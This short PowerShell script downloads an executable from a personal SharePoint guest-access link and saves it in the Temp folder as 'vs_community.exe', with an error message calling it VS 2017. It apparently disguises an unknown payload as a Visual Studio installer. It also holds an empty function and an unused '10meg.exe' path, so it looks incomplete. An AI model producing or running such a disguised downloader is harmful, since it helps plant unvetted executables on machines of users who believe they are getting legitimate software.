Function Get-RedirectedUrl
{
    Param (
        [Parameter(Mandatory=$true)]
        [String]$URL
    )   
}
$url = 'https://cheekandchongsupinthesmoke-my.sharepoint.com/personal/bulletformyvalentine_cheekandchongsupinthesmoke_onmicrosoft_com/_layouts/15/guestaccess.aspx?docid=1197a59ab31594530b932e6fa1b79ea0e&authkey=AQJTZdnA_Y4J7gnCeW6wtsM'
$codeSetupUrl = "$PSScriptroot\10meg.exe"
$vscodeSetup = "${env:Temp}\vs_community.exe"


try
{
    Invoke-WebRequest -Uri $Url -OutFile $vscodeSetup;
}
catch
{
    Write-Error "Failed to download VS 2017";
}